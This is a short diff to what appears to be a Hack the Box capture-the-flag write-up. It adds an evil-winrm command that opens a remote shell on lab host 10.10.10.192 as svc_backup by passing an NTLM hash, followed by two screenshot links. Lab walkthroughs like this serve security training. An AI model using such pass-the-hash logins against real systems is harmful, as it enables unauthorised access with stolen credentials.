@@ -173,3 +173,8 @@ rpcclient $> exit
 
 ---
 
+```CSS
+▶ evil-winrm -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d -i 10.10.10.192
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/2e8bd716-d569-42e5-82e1-cd04f05588ab)
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/d94aabbe-9752-4f60-a6cb-86b3a0f6cd18)
